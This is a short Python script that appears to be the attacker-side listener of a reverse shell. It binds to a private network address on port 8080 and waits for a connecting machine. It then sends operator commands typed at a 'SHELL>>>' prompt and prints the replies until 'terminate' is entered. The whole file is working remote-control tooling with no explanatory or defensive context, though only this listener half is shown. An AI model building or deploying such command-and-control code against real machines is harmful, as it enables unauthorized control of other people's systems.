#!/usr/bin/python

import socket

ip_addr = "192.168.74.132"
port = 8080


def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip_addr, port))
    s.listen(1)

    print("[!] Listening TCP connection from PORT 8080")

    conn, addr = s.accept()

    print("[+] We got a connection from : ", addr)

    while True:

        command = input("SHELL>>>").encode()

        if b"terminate" in command:
            conn.send(b"terminate")
            conn.close()
            break
        else:
            conn.send(command)
            response = conn.recv(1024)
            print(response.decode())


def main():
    connect()


if __name__ == "__main__":
    main()
